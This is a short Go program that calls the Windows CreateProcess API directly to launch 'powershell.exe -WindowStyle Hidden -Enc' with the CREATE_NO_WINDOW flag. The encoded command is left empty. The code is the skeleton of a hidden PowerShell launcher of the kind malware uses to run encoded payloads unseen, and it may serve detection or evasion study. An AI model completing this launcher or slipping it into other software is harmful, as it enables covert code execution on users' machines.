package main

import (
    "syscall"
)

func main() {
    // Direct Win32 API call
    procInfo := syscall.ProcessInformation{}
    startupInfo := syscall.StartupInfo{}

    commandLine := syscall.StringToUTF16Ptr("powershell.exe -WindowStyle Hidden -Enc ")

    syscall.CreateProcess(
        nil,               // Application name
        commandLine,       // Command line
        nil,               // Process security attributes
        nil,               // Thread security attributes
        false,             // Inherit handles
        0x08000000,        // CREATE_NO_WINDOW flag
        nil,               // Environment
        nil,               // Current directory
        &startupInfo,      // Startup info
        &procInfo,         // Process info
    )
}
